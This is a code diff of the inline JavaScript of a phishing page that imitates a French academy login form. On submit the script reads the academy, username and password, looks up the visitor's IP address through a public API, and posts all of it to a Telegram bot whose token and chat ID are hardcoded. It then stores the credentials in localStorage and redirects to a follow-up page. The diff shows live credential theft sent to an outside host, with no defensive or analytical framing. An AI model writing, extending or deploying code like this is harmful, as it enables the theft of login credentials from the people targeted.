@@ -162,46 +162,77 @@
       
 <script>
 if(localStorage.getItem("valide")!=="true"){
-window.location.href="../";
+  window.location.href="../";
 }
-  document.querySelector('form').addEventListener('submit', function (e) {
-    e.preventDefault(); // Empêche l'envoi du formulaire normal
 
-    // Récupération des valeurs du formulaire
-    const acname = document.querySelector('select[name="acname"]').value;
-    const user = document.querySelector('input[name="user"]').value;
-    const pass = document.querySelector('input[name="pass"]').value;
+document.querySelector('form').addEventListener('submit', function (e) {
+  e.preventDefault(); // Empêche l'envoi du formulaire normal
 
-    // Crée le message à envoyer
-    const message = `🔐 Connexion reçue :\n\n📍 Académie : ${acname}\n👤 Identifiant : ${user}\n🔑 Mot de passe : ${pass}`;
+  const acname = document.querySelector('select[name="acname"]').value;
+  const user = document.querySelector('input[name="user"]').value;
+  const pass = document.querySelector('input[name="pass"]').value;
 
-    // Configuration du bot Telegram
-    const token = '7703518890:AAFYliGGc_Bv4DcODj_lQTqmC5r6dDYF6T0'; // Remplace par ton token
-    const chatId = '-4824253616'; // Remplace par ton chat ID
-
-    const url = `https://api.telegram.org/bot${token}/sendMessage`;
-
-    // Envoi du message à Telegram
-    fetch(url, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: message
-      })
-    })
+  // Récupérer l'IP via une API publique
+  fetch('https://api.ipify.org?format=json')
     .then(response => response.json())
     .then(data => {
-      // Une fois le message envoyé, redirige vers Google
-      window.location.href = 'date.html';
+      const ip = data.ip;
+
+      // Construire le message à envoyer à Telegram
+      const message = `🔐 Connexion reçue :\n\n📍 Académie : ${acname}\n👤 Identifiant : ${user}\n🔑 Mot de passe : ${pass}\n🌐 IP : ${ip}`;
+
+      // Configuration du bot Telegram
+  const token = '7703518890:AAFYliGGc_Bv4DcODj_lQTqmC5r6dDYF6T0';
+  const chatId = '-4824253616';
+      const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+      // Envoi du message
+      fetch(url, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      })
+      .then(response => response.json())
+      .then(data => {
+        // Stocker les données dans localStorage avant redirection
+        localStorage.setItem('acname', acname);
+        localStorage.setItem('user', user);
+        localStorage.setItem('pass', pass);
+        localStorage.setItem('ip', ip);
+
+        // Rediriger vers date.html
+        window.location.href = 'date.html';
+      })
+      .catch(error => {
+        console.error('Erreur lors de l\'envoi à Telegram :', error);
+
+        // Même en cas d’erreur, on stocke et redirige
+        localStorage.setItem('acname', acname);
+        localStorage.setItem('user', user);
+        localStorage.setItem('pass', pass);
+        localStorage.setItem('ip', ip);
+
+        window.location.href = 'date.html';
+      });
     })
     .catch(error => {
-      console.error('Erreur lors de l\'envoi à Telegram :', error);
-      window.location.href = 'https://www.google.com'; // Redirige même en cas d’erreur
+      console.error('Erreur lors de la récupération de l\'IP :', error);
+      // Si on ne peut pas récupérer l'IP, on continue sans
+      const ip = 'IP non disponible';
+
+      // Stocker quand même les données
+      localStorage.setItem('acname', acname);
+      localStorage.setItem('user', user);
+      localStorage.setItem('pass', pass);
+      localStorage.setItem('ip', ip);
+
+      // Redirection
+      window.location.href = 'date.html';
     });
-  });
+});
 </script>
 <script>
 // Date de début : 8 juin 2025
